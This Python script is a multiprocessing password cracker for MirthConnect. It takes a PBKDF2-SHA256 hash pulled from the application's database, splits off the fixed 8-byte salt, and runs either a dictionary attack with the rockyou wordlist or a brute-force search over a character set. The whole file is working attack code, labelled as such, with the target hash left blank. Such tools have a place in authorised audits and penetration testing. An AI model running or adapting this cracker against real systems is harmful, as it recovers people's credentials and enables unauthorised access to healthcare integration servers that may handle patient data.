#!/usr/bin/env python3
"""
Optimized MirthConnect PBKDF2 Password Verification and Cracking Script
Handles PBKDF2WithHmacSHA256 hashes with 600,000 iterations
Optimized with: Fixed 8-byte salt, multiprocessing, and direct hash extraction
"""

import hashlib
import base64
import sys
from multiprocessing import Pool, Manager
from itertools import product
import string
from functools import partial
import time

class MirthPasswordCracker:
    # MirthConnect specific settings
    ALGORITHM = "pbkdf2_sha256"
    ITERATIONS = 600000
    HASH_METHOD = hashlib.sha256
    HASH_NAME = "sha256"
    SALT_LENGTH = 8  # Fixed 8-byte salt
    
    def __init__(self, stored_hash):
        """
        Initialize with the hash from the database.
        
        Args:
            stored_hash: Base64 encoded hash string
        """
        self.stored_hash = stored_hash
        self.hash_bytes = base64.b64decode(stored_hash)
        
        # Extract salt and derived key (salt is first 8 bytes)
        self.salt = self.hash_bytes[:self.SALT_LENGTH]
        self.stored_derived_key = self.hash_bytes[self.SALT_LENGTH:]
        
        print(f"[*] Hash loaded: {stored_hash}")
        print(f"[*] Hash length: {len(self.hash_bytes)} bytes")
        print(f"[*] Salt length: {self.SALT_LENGTH} bytes")
        print(f"[*] Salt (hex): {self.salt.hex()}")
        print(f"[*] Derived key length: {len(self.stored_derived_key)} bytes")
        
    def verify_password(self, password):
        """
        Verify if a password matches the stored hash.
        
        Args:
            password: Plain text password to verify
            
        Returns:
            True if password matches, False otherwise
        """
        try:
            # Derive key using PBKDF2 with fixed 8-byte salt
            derived_key = hashlib.pbkdf2_hmac(
                self.HASH_NAME,
                password.encode('utf-8'),
                self.salt,
                self.ITERATIONS,
                dklen=len(self.stored_derived_key)
            )
            
            return derived_key == self.stored_derived_key
            
        except Exception as e:
            print(f"[-] Error during verification: {e}")
            return False
    
    @staticmethod
    def _verify_password_worker(password, salt, stored_key, iterations, hash_name):
        """
        Worker function for multiprocessing password verification.
        
        Args:
            password: Password to test
            salt: Salt bytes
            stored_key: Derived key to compare against
            iterations: Number of PBKDF2 iterations
            hash_name: Hash algorithm name
            
        Returns:
            Password if match found, None otherwise
        """
        try:
            derived_key = hashlib.pbkdf2_hmac(
                hash_name,
                password.encode('utf-8'),
                salt,
                iterations,
                dklen=len(stored_key)
            )
            
            if derived_key == stored_key:
                return password
        except:
            pass
        
        return None
    
    def crack_password(self, wordlist_file=None, charset=None, max_length=10, num_processes=None):
        """
        Attempt to crack the password using a wordlist or brute force with multiprocessing.
        
        Args:
            wordlist_file: Path to wordlist file (if None, uses brute force)
            charset: Characters to use for brute force (if wordlist_file is None)
            max_length: Maximum password length for brute force
            num_processes: Number of processes to use (default: CPU count)
        """
        if wordlist_file:
            print(f"[*] Attempting dictionary attack with wordlist: {wordlist_file}")
            print(f"[*] Using multiprocessing for speed...")
            
            try:
                # Read all passwords first
                passwords = []
                with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                    for password in f:
                        password = password.strip()
                        if password:
                            passwords.append(password)
                
                print(f"[*] Loaded {len(passwords)} passwords")
                
                # Create worker function with fixed parameters
                worker_func = partial(
                    self._verify_password_worker,
                    salt=self.salt,
                    stored_key=self.stored_derived_key,
                    iterations=self.ITERATIONS,
                    hash_name=self.HASH_NAME
                )
                
                start_time = time.time()
                
                # Use multiprocessing to test passwords in parallel
                with Pool(processes=num_processes) as pool:
                    for i, result in enumerate(pool.imap_unordered(worker_func, passwords, chunksize=1000)):
                        if (i + 1) % 50000 == 0:
                            elapsed = time.time() - start_time
                            rate = (i + 1) / elapsed
                            print(f"[*] Tried {i + 1} passwords ({rate:.0f} p/s)...")
                        
                        if result:
                            elapsed = time.time() - start_time
                            print(f"\n[+] PASSWORD FOUND: {result}")
                            print(f"[+] Time elapsed: {elapsed:.2f} seconds")
                            return result
                            
            except FileNotFoundError:
                print(f"[-] Wordlist file not found: {wordlist_file}")
                return None
        else:
            # Brute force approach
            if charset is None:
                charset = string.ascii_lowercase + string.digits
            
            print(f"[*] Starting brute force attack with multiprocessing")
            print(f"[*] Charset: {charset}")
            print(f"[*] Max length: {max_length}")
            
            worker_func = partial(
                self._verify_password_worker,
                salt=self.salt,
                stored_key=self.stored_derived_key,
                iterations=self.ITERATIONS,
                hash_name=self.HASH_NAME
            )
            
            start_time = time.time()
            
            for length in range(1, max_length + 1):
                print(f"\n[*] Trying passwords of length {length}...")
                print(f"[*] Total combinations: {len(charset) ** length:,}")
                
                # Generate all combinations for this length
                password_generator = (''.join(attempt) for attempt in product(charset, repeat=length))
                
                with Pool(processes=num_processes) as pool:
                    for i, result in enumerate(pool.imap_unordered(worker_func, password_generator, chunksize=10000)):
                        if (i + 1) % 100000 == 0:
                            elapsed = time.time() - start_time
                            rate = (i + 1) / elapsed
                            print(f"[*] Tried {i + 1} passwords ({rate:.0f} p/s)...")
                        
                        if result:
                            elapsed = time.time() - start_time
                            print(f"\n[+] PASSWORD FOUND: {result}")
                            print(f"[+] Time elapsed: {elapsed:.2f} seconds")
                            return result
        
        print("[-] Password not found")
        return None


def main():
    # Example hash from your database
    stored_hash = ""
    
    cracker = MirthPasswordCracker(stored_hash)
    
    # Test with known passwords (examples)
    #print("\n=== Testing Known Passwords ===")
    #test_passwords = ["admin", "password123", "mirth", "test123"]
    #for pwd in test_passwords:
     #   result = cracker.verify_password(pwd)
      #  print(f"Password '{pwd}': {'MATCH' if result else 'NO MATCH'}")
    
    print("\n=== Dictionary Attack (Optimized with Multiprocessing) ===")
    cracker.crack_password(wordlist_file="/usr/share/wordlists/rockyou.txt")
    
    # Or brute force (faster than original with multiprocessing)
    # print("\n=== Brute Force Attack ===")
    # cracker.crack_password(charset=string.ascii_lowercase, max_length=6)


if __name__ == "__main__":
    main()
